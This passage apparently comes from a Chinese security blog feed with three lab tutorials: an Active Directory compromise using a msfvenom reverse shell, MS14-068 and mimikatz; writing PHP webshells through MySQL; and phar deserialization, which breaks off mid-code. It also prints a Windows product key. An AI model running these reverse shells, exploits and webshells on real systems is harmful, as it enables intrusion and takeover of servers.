域控制器中包含了由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。</p></blockquote><h1 id="域渗透AD环境搭建"><a href="#域渗透AD环境搭建" class="headerlink" title="域渗透AD环境搭建"></a>域渗透AD环境搭建</h1><ul><li>域控制器：<a href="ed2k://%7Cfile%7Ccn_win_srv_2003_r2_standard_x64_with_sp2_vl_cd1_X13-47363.iso%7C646281216%7C401FEF8B592F58BDAE69821512FA9681%7C/">windows server r2 standard</a><ul><li><a href="https://wenku.baidu.com/view/d05d73156edb6f1aff001f73.html">序列号</a> 简体中文标准版</li><li>PCGCG-MP77F-9DBC9-QHW44-TDBRD</li></ul></li><li>域用户：win7</li></ul><p>单域的环境还是比较简单的，网上搭建的教程也是比较多，因为我也是刚入门只搭了一个简单的一个域控制器DC+一个win7的域用户。</p><p>搭建教程可以参考这两篇文章：</p><ul><li><a href="https://zhuanlan.zhihu.com/p/31957064">知乎-域渗透初探（二）：域环境搭建</a></li><li><a href="https://www.cnblogs.com/-qing-/p/11193805.html">域渗透基础之环境搭建(单域到组件域林)</a></li></ul><p>我就简单说一下关键点和我踩到的坑：</p><ol><li><p>改两个的计算机名，后面比较方便</p></li><li><p>虚拟机搭建的情况下（大部分应该都是吧），虚拟机设置中得网络换成桥接。设置好IP使两台虚机在同一个局域网内，通过ip地址互ping能ping通，通过机器名也能ping通，ping域控服务器的计算器全名(带域后缀)也要ping的通。</p><p><img src="https://i.loli.net/2020/03/20/wzbN9FjsC17TZIM.png"></p></li><li><p>一直提示<strong>密码设置不符合要求</strong>或者<strong>第一次登陆需要更改密码</strong>有一直解决不了的话，可以考虑更改域控制器安全策略。参考<a href="https://blog.csdn.net/ZebraChroma/article/details/82896194">域用户无法修改密码问题的解决方案</a></p><p><img src="https://i.loli.net/2020/03/20/8pj1XwyLgBPlMFn.png"></p></li><li><p>分配内存的时候根据自己的机器来，分配少一点，比如总共8G(推荐16G)，可以各分1G，分的太多容易导致物理机崩溃。多渗透环境的话，可能还是需要16G以上内存才能跑得起来。。。</p></li></ol><p>其他好像没什么，按照教程来就行。</p><p><strong>测试的域环境结构</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域：pentestlab.com</span><br><span class="line">域控：windows Server 2003 R2，IP: 192.168.0.105</span><br><span class="line">域成员：windows 7x64,IP: 192.168.0.106</span><br><span class="line">攻击者：kaliLinux IP: 192.168.0.108 </span><br></pre></td></tr></table></figure><h1 id="简单尝试"><a href="#简单尝试" class="headerlink" title="简单尝试"></a>简单尝试</h1><h2 id="win7反弹shell"><a href="#win7反弹shell" class="headerlink" title="win7反弹shell"></a>win7反弹shell</h2><p>假设控制了域网内的一台电脑，要将权限从local admin 提高到Domain admin，访问包括Domain Controller在内的域内中任何一台电脑</p><p>首先得拿到一个shell</p><ul><li>上传Metasploit的反弹马，shell下执行命令</li></ul><p>生成反弹马（用exe的）</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.0.108 LPORT&#x3D;23333 -f exe &gt; .&#x2F;Desktop&#x2F;re.exe</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/1XP8pcbuCnimOdW.png"></p><p>msfconsole设置监听并启动</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.108</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.108</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set port 23333</span><br><span class="line">port &#x3D;&gt; 23333</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/yqoGbeCRz6Jg8vr.png"></p><p>shell有中文，所以存在乱码（但是没有关系）</p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>拿到shell后，进行必要的信息收集。</p><p><a href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a></p><p>常见的信息收集命令：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE% //查看系统版本位数</span><br><span class="line"></span><br><span class="line">netstat -ano //查看开放的端口</span><br><span class="line"></span><br><span class="line">net config Workstation //当前计算机名，全名，用户名，系统版本，工作站域，登陆域</span><br><span class="line"></span><br><span class="line">net user /domain b404 pass //修改域内用户密码，需要管理员权限</span><br><span class="line"></span><br><span class="line">tasklist /S IP地址 /U 域名\用户名 /P /V  //查看远程计算机进程</span><br><span class="line"></span><br><span class="line">tasklist /svc //查看进程</span><br><span class="line"></span><br><span class="line">taskkill /im 进程名称(cmd.exe) //结束进程</span><br><span class="line"></span><br><span class="line">taskkill /pid[进程码] //-t(结束该进程) -f(强制结束该进程以及所有子进程)</span><br><span class="line"></span><br><span class="line">ipconfig /all //用来查看当前机器的网络环境,判断是工作组,还是域环境.网段是怎么划分的,每个段有多少台机器,DNS服务器IP是多少。</span><br><span class="line"></span><br><span class="line">net view//用来查看跟本机有关联的机器名.注意,是跟本机有关联的机器,而不是一个段的机器.</span><br><span class="line"></span><br><span class="line">net view /domain//用来查看当前网络环境存在几个域.</span><br><span class="line"></span><br><span class="line">net view /domain:xxxx//查看xxx域中存在的跟本机有关联的机器.</span><br><span class="line"></span><br><span class="line">net group &quot;domain admins&quot; /domain//查看域内管理员.</span><br><span class="line"></span><br><span class="line">net user /domain//查看域内的用户名.</span><br><span class="line"></span><br><span class="line">net group &quot;domain computers&quot; /domain//查看域内所有机器名.</span><br><span class="line"></span><br><span class="line">net time /domain//查看域时间及域服务器的名字</span><br><span class="line"></span><br><span class="line">Nslookup -type=SRV _ldap._tcp.//查询DNS</span><br><span class="line"></span><br><span class="line">netstat//查看连接信息.</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Controllers&quot; /domain//查找域控</span><br><span class="line"></span><br><span class="line">nbtstat//由IP地址得到机器名</span><br><span class="line"></span><br><span class="line">ping 扫描内网存活主机：</span><br><span class="line">for /l %i in (1,1,255) do @ping 192.168.200.%i -w 1 -n 1 | find /i&quot;ttl&quot;</span><br><span class="line"></span><br><span class="line">查看是否支持PowerShell：</span><br><span class="line">if defined PSModulePath (echo support powershell) else (echo not support powershell)</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/JZrvnBcjYQUupVD.png"></p><p>得到一些信息：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">域：pentestlab.com</span><br><span class="line">域控制器：DCSERVER</span><br><span class="line">主机:Win7-PC1</span><br><span class="line"></span><br><span class="line">IPs：</span><br><span class="line">192.168.0.1 &#x2F;&#x2F;可能是网关</span><br><span class="line">192.168.0.105 </span><br><span class="line">192.168.0.106 &#x2F;&#x2F;win7主机，可控</span><br><span class="line">192.168.0.108 &#x2F;&#x2F;攻击机</span><br><span class="line">&#x2F;&#x2F;实际环境下应该还存在很多存活的主机，无法通过这样就简单确定域控制器的IP。</span><br><span class="line"></span><br><span class="line">支持powershell</span><br><span class="line"></span><br><span class="line">某些端口开启：</span><br><span class="line">80(web服务),443(https),135(RPC),3306(mysql),3389(windows远程连接)</span><br></pre></td></tr></table></figure><h2 id="从local-admin到domain-admin"><a href="#从local-admin到domain-admin" class="headerlink" title="从local admin到domain admin"></a>从local admin到domain admin</h2><p>我们利用MS14-068漏洞提升普通用户的权限为与管理员（Domain admin）的身份。</p><p>详细原理参考：<a href="http://www.freebuf.com/vuls/56081.html">深入解读MS14-068漏洞</a></p><blockquote><p>该漏洞利用Kerberos协议的算法和信息存放以及任意签名问题</p><p>Kerberos协议是一种基于第三方可信主机的计算机网络协议，它允许两个实体之间在非安全网络环境（可能被窃听、被重放攻击）下以一种安全的方式证明自己的身份。</p></blockquote><p>攻击工具: <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a></p><p>利用该工具需要：</p><ol><li><p>SID:</p><p><img src="https://i.loli.net/2020/03/20/fZ3SINgrTqQRJep.png"></p></li><li><p>域控制器名称和域名称：DCServer</p></li><li><p>python环境（测试使用python2.7.14）</p></li></ol><p>获取TGT并且清除缓存票据</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MS14-068.exe -u Win7-PC1@pentestlab.com -p V0Wldl19980114 -s S-1-5-21-2650578945-2920865233-32666330-1107 -d DCServer.pentestlab.com</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/L4SaPes5rgB89Dq.png"></p><p>注入TGT，注意注入TGT时，需要将上一步得到的票据放到相应的目录。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptc TGT_Win7-PC1@pentestlab.com.ccache&quot; exit</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/20/PjARhBCO5wDQpIZ.png"></p><p><img src="https://i.loli.net/2020/03/20/Ok7WKivzXlC1pFr.png"></p><p>访问域控DCServer的资源<code>\\DCServer\c$</code>，把shell——re.exe放到c盘目录，准备用这个文件反弹shell。</p><p><img src="https://i.loli.net/2020/03/20/bmxq4SyKI8AotYZ.png"></p><p>添加定时任务，反弹shell，成功获取域控的system权限。</p><p><img src="https://i.loli.net/2020/03/20/58j6zSu1b7IVRZm.png"></p><p><img src="https://i.loli.net/2020/03/20/3zjSBbfn9y6XQeZ.png"></p><h1 id="总结与后记"><a href="#总结与后记" class="headerlink" title="总结与后记"></a>总结与后记</h1><p>本文主要是通过一个<code>MS14-068</code>漏洞复现了一个简单域渗透的情景，初窥域渗透和内网渗透。内网渗透确实博大精深，内容很多，知识很杂，听说到更精深的情况是能够自己写免杀和新漏洞的PoC，这甚至还需要二进制的知识。也是希望自己能够通过像这样不断的学习和总结，逐渐摸到门道，慢慢摸索经验，一步步深入吧。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mysql写shell的一点总结</title>
      <link href="/2020/03/14/mysql-getshell/"/>
      <url>/2020/03/14/mysql-getshell/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>利用SQL注入，当存在一定的利用条件时，我们可以利用mysql进行文件的写入，在知道网站绝对路径的情况下，可以通过这种方式写入shell。</p><h1 id="0x01-利用条件"><a href="#0x01-利用条件" class="headerlink" title="0x01 利用条件"></a>0x01 利用条件</h1><ol><li><p>数据库当前用户为root权限或者至少有FILE权限</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select file_priv,user,host from mysql.user;</span><br><span class="line">+-----------+------+-----------+</span><br><span class="line">| file_priv | user | host      |</span><br><span class="line">+-----------+------+-----------+</span><br><span class="line">| Y         | root | localhost |</span><br><span class="line">| Y         | root | 127.0.0.1 |</span><br><span class="line">| Y         | root | ::1       |</span><br><span class="line">+-----------+------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></li><li><p>知道当前网站的绝对路径</p></li><li><p>php的gpc为off状态, 在开启gpc的情况下，可以通过十六进制的路径读写文件</p></li><li><p>写入的那个路径存在写权限</p></li><li><p><code>secure_file_priv=&#39;&#39;</code></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@secure_file_priv;</span><br><span class="line">+-----------------------+</span><br><span class="line">| @@secure_file_priv    |</span><br><span class="line">+-----------------------+</span><br><span class="line">| &#x2F;var&#x2F;lib&#x2F;mysql-files&#x2F; |</span><br><span class="line">+-----------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">secure_file_priv可以设置如下这样进行设置：</span><br><span class="line">1. 设置为空，那么对所有路径均可进行导入导出。</span><br><span class="line">2. 设置为一个目录名字，那么只允许在该路径下导入导出。</span><br><span class="line">3. 设置为Null，那么禁止所有导入导出。</span><br><span class="line"></span><br><span class="line">需要在mysql的配置文件中更改：</span><br><span class="line">[mysqld]</span><br><span class="line">secure_file_priv&#x3D;&quot;&quot;</span><br></pre></td></tr></table></figure></li></ol><h1 id="0x02-读取web路径"><a href="#0x02-读取web路径" class="headerlink" title="0x02 读取web路径"></a>0x02 读取web路径</h1><h2 id="2-1-利用报错"><a href="#2-1-利用报错" class="headerlink" title="2.1 利用报错"></a>2.1 利用报错</h2><p>有时候<code>information_schema.tables</code>不能用时，在<strong>MySQL 5.6</strong>及以上版本中可以使用以下表</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?id&#x3D;1&#39; union select 1,group_concat(table_name) from mysql.innodb_table_stats where database_name&#x3D;schema()%23&amp;Submit&#x3D;Submit%23</span><br><span class="line">?id&#x3D;1&#39; union select 1,group_concat(table_name) from mysql.innodb_index_stats where database_name&#x3D;schema()%23&amp;Submit&#x3D;Submit%23</span><br></pre></td></tr></table></figure><h2 id="2-2-phpinfo"><a href="#2-2-phpinfo" class="headerlink" title="2.2 phpinfo"></a>2.2 phpinfo</h2><p><img src="https://i.loli.net/2020/03/22/vBiFuHg7pAKL2Ps.png"></p><h2 id="2-3-load-file读配置文件"><a href="#2-3-load-file读配置文件" class="headerlink" title="2.3 load_file读配置文件"></a>2.3 load_file读配置文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;default&#39;);</span><br></pre></td></tr></table></figure><p>有时候过滤了敏感路径可以试试这样：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT LOAD_FILE(&#39;&#x2F;etc&#x2F;otherdir&#x2F;..&#x2F;passwd&#39;);</span><br></pre></td></tr></table></figure><h2 id="2-4-通过mysql函数和全局变量-查找mysql安装目录"><a href="#2-4-通过mysql函数和全局变量-查找mysql安装目录" class="headerlink" title="2.4 通过mysql函数和全局变量 查找mysql安装目录"></a>2.4 通过mysql函数和全局变量 查找mysql安装目录</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select @@basedir;</span><br><span class="line">+-----------+</span><br><span class="line">| @@basedir |</span><br><span class="line">+-----------+</span><br><span class="line">| &#x2F;usr&#x2F;     |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select @@datadir;</span><br><span class="line">+-----------------+</span><br><span class="line">| @@datadir       |</span><br><span class="line">+-----------------+</span><br><span class="line">| &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; |</span><br><span class="line">+-----------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; show variables like &#39;datadir&#39;;</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| Variable_name | Value           |</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| datadir       | &#x2F;var&#x2F;lib&#x2F;mysql&#x2F; |</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br></pre></td></tr></table></figure><blockquote><p>@@ 用于系统变量</p><p>@ 往往用于用户定义的变量</p></blockquote><h1 id="0x03-常见方法写shell"><a href="#0x03-常见方法写shell" class="headerlink" title="0x03 常见方法写shell"></a>0x03 常见方法写shell</h1><h2 id="3-1-select-into"><a href="#3-1-select-into" class="headerlink" title="3.1 select * into"></a>3.1 select * into</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; select &#39;&lt;? phpinfo(); ?&gt;&#39; into outfile &#39;E:&#x2F;1.txt&#39;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select &#39;&lt;? phpinfo(); ?&gt;&#39; into outfile &#39;E:&#x2F;1.txt&#39;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="3-2-基于log日志写shell法"><a href="#3-2-基于log日志写shell法" class="headerlink" title="3.2 基于log日志写shell法"></a>3.2 基于log日志写shell法</h2><blockquote><p><a href="http://sh1yan.top/2018/05/26/mysql-writ-shell/">http://sh1yan.top/2018/05/26/mysql-writ-shell/</a></p><p>查询当前mysql下log日志的默认地址，同时也看下log日志是否为开启状态，并且记录下原地址，方便后面恢复。</p><p><code>set global general_log = on;</code><br>开启日志监测，一般是关闭的，如果一直开，文件会很大的。</p><p><code>set global general_log_file = ‘G:/2.txt’;</code><br>这里设置我们需要写入的路径就可以了。</p><p><code>select ‘&lt;?php eval($_POST[‘shiyan’]);?&gt;’;</code><br>查询一个一句话，这个时候log日志里就会记录这个。</p><p><code>set global general_log_file = ‘D:\xampp\mysql\data\LAPTOP-SO1V6ABB.log’;</code><br>结束后，再修改为原来的路径。</p><p><code>set global general_log = off;</code><br>关闭下日志记录。</p></blockquote><p><img src="https://i.loli.net/2020/03/22/Sj5szw37rNXHuDm.png" alt="20200322145847.png"></p><h2 id="3-3-创建表，导出数据"><a href="#3-3-创建表，导出数据" class="headerlink" title="3.3 创建表，导出数据"></a>3.3 创建表，导出数据</h2><p>其实和第一种方法差不多。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use test;</span><br><span class="line">drop table if exists vow;</span><br><span class="line">create table vow(name text not null);</span><br><span class="line">insert into vow(name) values(&#39;&lt;?php phpinfo(); ?&gt;&#39;);</span><br><span class="line">select name from vow into outfile &#39;E:&#x2F;5.txt&#39;;</span><br><span class="line">drop tables vow;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> webshell </tag>
            
            <tag> mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>phar扩展php反序列化的攻击面</title>
      <link href="/2020/03/12/phar-unsearise/"/>
      <url>/2020/03/12/phar-unsearise/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前学校的seaii表哥在404发了一篇paper——<a href="https://paper.seebug.org/680/">利用 phar 拓展 php 反序列化漏洞攻击面</a></p><p>分析了php反序列与phar的结合，大大拓展了反序列化的攻击面，我也重新审视这个漏洞，发现真的很有意思，并且有较大的杀伤力。之前分析过了<strong>php反序列化与POP链</strong>，本文就主要分析一下如何利用phar来扩展php反序列化的攻击面，并从源码角度来看一下为什么很多文件操作函数可以触发phar的反序列化。（另外膜拜一下seaii哥，啥时候能像seaii哥这么优秀啊。。。）</p><p>利用phar文件会以序列化的形式存储用户自定义的<code>meta-data</code>这一特性，拓展了php反序列化漏洞的攻击面。该方法在<strong>文件系统函数</strong>（<code>file_exists()</code>、<code>is_dir()</code>等）参数可控的情况下，配合<strong>phar://伪协议</strong>，可以不依赖unserialize()直接进行反序列化操作。</p><h1 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h1><p>详细的文件结构这一查看php文档——<a href="https://www.php.net/manual/en/phar.fileformat">What makes a phar a phar and not a tar or a zip?</a></p><h2 id="a-stub"><a href="#a-stub" class="headerlink" title="a stub"></a>a stub</h2><p>可以理解为一个标志，phar前面内容不限，但必须以<code>__HALT_COMPILER();</code>来结尾(<code>?&gt;</code>可以省略也可以包含)，否则phar扩展将无法识别这个文件为phar文件。</p><h2 id="a-manifest-describing-the-contents（一个描述内容的清单）"><a href="#a-manifest-describing-the-contents（一个描述内容的清单）" class="headerlink" title="a manifest describing the contents（一个描述内容的清单）"></a>a manifest describing the contents（一个描述内容的清单）</h2><p>phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以<strong>序列化</strong>的形式存储用户自定义的meta-data，这是上述攻击手法最核心的地方。</p><table><thead><tr><th align="left">Size in bytes</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">4 bytes</td><td align="left">phar清单的长度(以字节为单位)(1 MB limit)</td></tr><tr><td align="left">4 bytes</td><td align="left">Phar中的文件数</td></tr><tr><td align="left">2 bytes</td><td align="left">Phar清单的API版本 (currently 1.0.0)</td></tr><tr><td align="left">4 bytes</td><td align="left">全局的phar位示图标志</td></tr><tr><td align="left">4 bytes</td><td align="left">phar的别名长度</td></tr><tr><td align="left">??</td><td align="left">phar的位示图长度</td></tr><tr><td align="left">4 bytes</td><td align="left">phar元数据长度（0表示无）</td></tr><tr><td align="left">??</td><td align="left">序列化的phar元数据，以**serialize()**格式存储</td></tr><tr><td align="left">只要24*条目字节数</td><td align="left">每个文件的条目</td></tr></tbody></table><h2 id="the-file-contents"><a href="#the-file-contents" class="headerlink" title="the file contents"></a>the file contents</h2><p>被压缩文件的内容</p><h2 id="可选-验证phar完整性的签名"><a href="#可选-验证phar完整性的签名" class="headerlink" title="[可选] 验证phar完整性的签名"></a>[可选] 验证phar完整性的签名</h2><p>签名，放在文件末尾，格式如下：</p><table><thead><tr><th align="left">Length in bytes</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">16 or 20 bytes</td><td align="left">实际签名，SHA1签名为20字节，MD5签名为16字节，SHA256签名为32字节，SHA512签名为64字节。</td></tr><tr><td align="left">4 bytes</td><td align="left">签名标志. <em>0x0001</em> 用于表示是 MD5 签名, <em>0x0002</em> 用来表示是 SHA1 签名, <em>0x0004</em> 用来表示是SHA256签名, <em>0x0008</em>用来表示是SHA512签名。 API版本1.1.0引入了SHA256和SHA512签名支持。</td></tr><tr><td align="left">4 bytes</td><td align="left">Magic <em>GBMB</em> 用于定义签名的存在</td></tr></tbody></table><h1 id="构造一个phar文件"><a href="#构造一个phar文件" class="headerlink" title="构造一个phar文件"></a>构造一个phar文件</h1><h2 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a>phar文件</h2><p>根据文件结构，自己来构造一个phar文件，php内置了一个phar类处理的相关操作。</p><blockquote><p>注意：要将<code>php.ini</code>中的<code>phar.readonly</code>选项设置为Off，否则无法生成phar文件。</p></blockquote><p>phar.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="comment">//__HALT_COMPILER(); 也是可以的</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/03/15/t6eI95JmQZ4Cw1L.png"></p><p>meta-data是用反序列化形式存储的。</p><p>有序列化数据必然会有反序列化操作，php一大部分的<a href="http://php.net/manual/en/ref.filesystem.php">文件系统函数</a>在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><table><thead><tr><th>受影响的函数列表</th><th></th><th></th><th></th></tr></thead><tbody><tr><td>filename</td><td>filectime<br />(获取文件的inode更改时间)</td><td>file_exists</td><td>file_get_contents</td></tr><tr><td>file_put_contents</td><td>file</td><td>filegroup<br />(获取文件的组名)</td><td>fopen</td></tr><tr><td>fileinode<br />（获取文件inode）</td><td>filemtime<br />（获取文件的修改时间）</td><td>fileowner</td><td>fileperms<br />（获取文件权限）</td></tr><tr><td>is_dir</td><td>is_executable</td><td>is_file</td><td>is_link<br />（判断文件名是否为符号链接）</td></tr><tr><td>is_readable</td><td>is_writable</td><td>is_writeable</td><td>parse_ini_file<br />（解析配置文件）</td></tr><tr><td>copy</td><td>unlink</td><td>stat<br />（获取文件相关信息）</td><td>readfile<br />（输入文件内容）</td></tr></tbody></table><p>试一下，文件操作函数，能否自动对其进行反序列化：</p><p><code>test.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Destruct called\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;wakeup called\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $filename = <span class="string">&#x27;phar://phar.phar/test.txt&#x27;</span>;</span><br><span class="line">    file_get_contents($filename); </span><br><span class="line">    <span class="comment">//file_exists($filename);</span></span><br><span class="line">    <span class="comment">//file($filename);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>于是当文件系统函数的参数可控时，我们可以在不调用<code>unserize()</code>的情况下，进行反序列化操作，许多的文件函数都可以触发，极大地拓展了攻击面。</p><blockquote><p>注意：</p><p>对于一个前后调用多个file函数的phar文件，只会反序列化一次。</p></blockquote><p>比如，将上述代码注释去掉，也是只有<code>file_get_contents</code>会反序列一次phar，后续的文件处理函数，都会基于之前反序列化完成的文件进行操作。(调用堆栈也可以说明这一点。)</p><p><img src="https://i.loli.net/2020/03/15/HSUOBbzWIuV8FMh.png"></p><h2 id="将phar在伪造成其他文件"><a href="#将phar在伪造成其他文件" class="headerlink" title="将phar在伪造成其他文件"></a>将phar在伪造成其他文件</h2><blockquote><p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p></blockquote><p>phar2.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">TestObject</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @unlink(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub，增加gif文件头</span></span><br><span class="line">    $o = <span class="keyword">new</span> TestObject();</span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>并且，即使将文件名修改掉，用test.php测试发现仍然可以识别为phar，执行wakeup和destrcut。</p><p><img src="https://i.loli.net/2020/03/15/TJUuKnl4k78M5Fa.png"></p><p><img src="https://i.loli.net/2020/03/15/ADHFwBxkd9vV4QZ.png"></p><p>这样可以绕过大部分的上传waf。</p><h1 id="实际利用"><a href="#实际利用" class="headerlink" title="实际利用"></a>实际利用</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>结合之前所说的，利用条件有三：</p><ol><li>phar文件可以上传到服务器</li><li>要有魔术方法作为“跳板”</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等字符没有过滤。</li></ol><h2 id="先从一个简单的例子开始"><a href="#先从一个简单的例子开始" class="headerlink" title="先从一个简单的例子开始"></a>先从一个简单的例子开始</h2><p>这里用<a href="https://www.smi1e.top/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB%E6%8B%93%E5%B1%95/#i-7">Smi1e师傅</a>写的一个简单的例子：</p><p><code>upload_file.php</code>后端检测文件上传，文件类型是否为gif，文件后缀名是否为gif</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span 